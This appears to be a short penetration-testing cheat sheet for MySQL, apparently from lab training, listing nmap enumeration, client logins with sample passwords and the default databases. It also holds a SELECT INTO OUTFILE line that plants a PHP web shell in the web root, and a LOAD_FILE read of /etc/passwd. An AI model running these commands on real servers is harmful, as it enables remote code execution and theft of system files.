# [[nmap]]
```shell
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

# Client:
##### Linux
```shell
mysql -u root -pP4SSw0rd -h 10.129.14.128

show databases;

select version();

use mysql; show tables;
```
##### Windows
```cmd
mysql.exe -u username -pPassword123 -h 10.129.20.13
```

##### GUI
Download: https://github.com/dbeaver/dbeaver/releases
```bash
sudo dpkg -i dbeaver-<version>.deb
dbeaver
```

# Default databases
- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

# Read/Write Local Files
```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
#### Check privileges
```sql
show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```
#### Read files
```sql
select LOAD_FILE("/etc/passwd");
```
